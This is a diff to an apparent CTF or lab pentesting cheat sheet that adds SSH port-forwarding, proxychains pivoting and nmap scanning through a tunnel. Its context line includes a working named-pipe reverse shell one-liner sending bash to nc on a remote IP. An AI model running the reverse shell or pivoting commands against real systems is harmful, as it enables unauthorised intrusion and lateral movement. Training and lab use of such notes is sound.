@@ -65,10 +65,13 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 # Port-Forwarding ✅
 ## SSH ✡️
 ```bash
+ssh 10.10.10.10 -i id_rsa -D 1337 # use proxychane
 ssh -L 7777:localhost:80 user@10.10.10.10 # (YOU <-- CLIENT) transfer port from target system to our system
 ssh -R 80:localhost:9999 user@10.10.10.10 # (YOU --> CLIENT) transfer port from our system to target system
-ssh -C2qTnN -D 1080 user@target.host
-ssh -tt -L8080:localhost:8157 solcoteh@10.10.10.10 ssh -t -D 8157 solcoteh@10.10.10.10 -p 222
+ssh -C2qTnN -D 1080 user@10.10.10.10
+ssh -t -D 8157 solcoteh@10.10.10.10 -p 222
+ssh -tt -L8080:localhost:8157 solcoteh@10.10.10.10
+
 -oHostKeyAlgorithms=+ssh-rsa
 -oPubkeyAcceptedKeyTypes=+ssh-rsa
 ```
@@ -122,6 +125,16 @@ sudo rustscan -a $ip -- -sV -T5
 sudo nmap -p $PORTS -sV $ip -T5
 PORTS=$(sudo nmap -p- $ip -T5 | grep -oE '[0-9]{1,5}/' | tr -d '\n' | tr '/' ',' | sed 's/,$//')
 ```
+## Target_Enumeration_With_proxychane ✅
+```bash
+ssh 10.10.217.6 -i id_rsa -D 1337
+sudo nano /etc/proxychains4.conf # to end file and change  ( socks5 127.0.0.1 1337 )
+sudo proxychains4 ip a # run "ip a" command in our kali but exce in target
+sudo proxychains4 nmap -sT 127.0.0.1 # port target scan in our kali
+sudo proxychains4 nmap -sn 10.10.233.188/24 # ip target scan in our kali
+sudo ssh errorcauser@10.10.217.6 -i id_rsa -L 80:127.0.0.1:8000 # (YOU <-- CLIENT) transfer port from target system to our system
+```
+
 [Automate Tool](https://github.com/solcoteh/NmapScan_Automate)
 
 ## Network_Scan_Enumeration ✅
